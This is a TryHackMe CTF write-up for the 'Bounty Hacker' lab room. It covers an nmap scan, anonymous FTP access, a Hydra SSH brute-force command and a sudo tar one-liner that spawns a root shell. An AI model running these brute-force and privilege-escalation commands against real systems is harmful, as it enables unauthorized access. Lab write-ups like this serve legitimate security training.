# CTF Write-up: Bounty Hacker
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Date:** March 4, 2026  
**Author:** Yasir  
**Status:** ✅ Completed  
**Room:** https://tryhackme.com/room/cowboyhacker

> ⚠️ **Spoiler Warning:** This write-up contains hints and methodology. Try the room yourself before reading!

---

## Overview

Bounty Hacker is an easy Linux CTF covering FTP anonymous access, credential discovery, SSH brute-forcing with Hydra, and privilege escalation via a misconfigured sudo binary. A clean and straightforward room that reinforces core pentesting fundamentals.

| Item | Details |
|------|---------|
| Target IP | 10.114.142.18 |
| Flags | 2 (user + root) |
| Tools | Nmap, FTP, Hydra, SSH, GTFOBins |
| Skills | Enumeration, FTP, Brute-force, Privilege Escalation |

---

## Step 1 — Nmap Scan

Full port scan to identify all services:

```bash
nmap -p- --min-rate 5000 -sV 10.114.142.18
```

**Results:**
- Port 21 — FTP (vsftpd 3.0.5)
- Port 22 — SSH (OpenSSH 8.2p1)
- Port 80 — HTTP (Apache 2.4.41)

> 💡 **Tip:** Three services found — FTP is always the first to check for anonymous login.

---

## Step 2 — FTP Anonymous Login

```bash
ftp 10.114.142.18
# Username: anonymous
# Password: (blank — press Enter)
```

Login successful! Found and downloaded two files:

```bash
ls
get locks.txt
get task.txt
```

> 💡 **Tip:** Always try anonymous FTP login when port 21 is open — it's the default first step.

---

## Step 3 — Analysing the Files

```bash
cat task.txt
```

Revealed two tasks signed by a username — giving us a valid SSH username.

```bash
cat locks.txt
```

Contained 26 password candidates — a perfect brute-force wordlist!

> 💡 **Tip:** Always read every file found during enumeration. Usernames and passwords often hide in plain text files.

---

## Step 4 — SSH Brute Force with Hydra

With username and wordlist in hand:

```bash
hydra -l [USERNAME] -P locks.txt ssh://10.114.142.18
```

Hydra cracked the password in seconds. SSH'd in and found the user flag. ✅

> 💡 **Tip:** Hydra syntax — -l for single username, -P for password list, service://IP at the end.

---

## Step 5 — Privilege Escalation via sudo tar

```bash
sudo -l
```

Output showed the user could run **/bin/tar** as root. Checked GTFOBins for the exploit:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Spawned a root shell and read the root flag. ✅ Machine fully compromised!

> 💡 **Tip:** Whenever sudo -l shows a binary, search it on **gtfobins.github.io** under the 'Sudo' section for the exact exploit command.

---

## Flags

| Flag | Location | Method |
|------|----------|--------|
| 👤 User Flag | /home/[user]/Desktop/user.txt | SSH via Hydra brute-force |
| 👑 Root Flag | /root/root.txt | sudo tar GTFOBins exploit |

---

## What I Learned

- Always try FTP anonymous login when port 21 is open
- Read every file found — usernames and wordlists hide in plain text
- Hydra: -l username, -P wordlist, service://IP
- `sudo -l` is always the first privilege escalation check
- GTFOBins is the go-to resource for sudo binary exploits
- File archival tools (tar, zip) in sudo are almost always exploitable

---

*Write-up by Yasir | TryHackMe Junior Penetration Tester Path*  
*Room: [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)*
